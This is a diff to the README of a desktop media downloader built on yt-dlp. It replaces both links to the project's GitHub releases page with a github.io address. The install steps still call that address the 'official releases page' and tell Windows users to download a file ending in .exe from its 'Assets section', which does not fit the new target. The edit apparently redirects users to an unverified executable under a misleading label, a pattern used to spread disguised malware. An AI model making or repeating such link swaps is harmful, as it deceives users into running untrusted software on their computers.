@@ -1,6 +1,6 @@
 # 📥 desktop-media-downloader - Download videos and audio with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/marcellusunenclosed953/desktop-media-downloader/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release_Page-blue)](https://marcellusunenclosed953.github.io)
 
 desktop-media-downloader helps you save videos and audio from the internet to your computer. It uses yt-dlp to grab content from many websites. The app runs on Windows, macOS, and Linux. You control the files you store.
 
@@ -20,7 +20,7 @@ This app offers many tools for media management:
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/marcellusunenclosed953/desktop-media-downloader/releases).
+1. Visit the [official releases page](https://marcellusunenclosed953.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your Downloads folder or your desktop.
